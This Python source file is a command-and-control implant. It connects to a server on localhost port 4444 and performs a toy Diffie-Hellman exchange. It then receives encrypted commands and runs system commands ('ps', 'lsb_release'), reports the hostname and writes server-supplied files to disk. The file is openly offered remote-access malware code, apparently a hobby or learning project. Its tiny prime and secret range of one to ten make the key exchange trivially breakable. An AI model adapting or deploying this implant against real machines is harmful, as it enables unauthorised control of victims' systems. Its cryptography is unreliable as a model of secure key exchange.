#!/bin/python3
import socket
import datetime
import json
import time
import subprocess
import hashlib
import random
import base64
from Crypto.Cipher import AES
from Crypto import Random
import nacl.secret
import nacl.utils
class key:
    
    def __init__(self):
        self.p = 991
        self.g = 6
        self.secret = random.randint(1,10)
        self.half_key = self.gen_half()

    def gen_half(self):
        half_key = pow(self.g, self.secret, self.p)
        return half_key

    def gen_full(self, new_half):
        full_key = pow(new_half, self.secret, self.p)
        return hashlib.sha256(str(full_key).encode()).hexdigest()[:32].encode()

class C2_AES:
    
    def __init__(self, key):
        self.box = nacl.secret.SecretBox(key)

    def encrypt(self, raw):
        msg = self.box.encrypt(raw.encode())
        #msg = base64.b64encode(msg)
        #print(len(msg))
        return(msg)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        msg = self.box.decrypt(enc[24:], enc[:24])
        return msg


class implant:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
    def connect(self):
        self.sock = socket.create_connection((self.ip, self.port))

    def send_msg(self, data):
        aes = C2_AES(self.aes_secret)
        msg = aes.encrypt(data)
        self.sock.send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)

    def communicate(self):
        while True:
            data_len = self.sock.recv(16)
            data = self.sock.recv(int(data_len.decode()))
            while len(data) != int(data_len):
                data += self.sock.recv(int(data_len.decode()))
            aes = C2_AES(self.aes_secret)
            data = aes.decrypt(data)
            data = json.loads(data)
            print(f"Recieved {data['command']}")
            if data['command'] == "test":
                print("Sending synack...")
                time.sleep(1)
                self.send_msg("synack")
            elif data['command'] == "lsb_release":
                data = subprocess.check_output(['lsb_release', '-a'])
                self.send_msg(data.decode())
            elif data['command'] == "ps":
                data = subprocess.check_output(['ps', '-ef'])
                self.send_msg(data.decode())
            elif data['command'] == "heartbeat":
                self.send_msg("im alive")
            elif "upload" in data["command"]:
                filename = data['command'].split()[1]
                location = data['command'].split()[2]
                upload_data = data["data"]
                if filename.split('/')[-1].split(":")[-1] == location.split("/")[-1]:
                    with open(location.split(":")[-1], 'wb') as f:
                        f.write(base64.b64decode(upload_data))
                self.send_msg("File Uploaded!")


    def intro(self):
        key_gen = key()
        time_info = datetime.datetime.now()
        self.implant_info = {
        "hostname" : socket.gethostname(),
        "date" : f"{time_info.day}-{time_info.month}-{time_info.year}",
        "time" : f"{time_info.hour}:{time_info.minute}:{time_info.second}",
        "number" : f"{key_gen.half_key}"
        }
        self.sock.send(json.dumps(self.implant_info).encode())
        server_half = self.sock.recv(1024)
        self.aes_secret = key_gen.gen_full(int(server_half.decode()))

my_implant = implant('127.0.0.1', 4444)
my_implant.connect()
my_implant.intro()
my_implant.communicate()
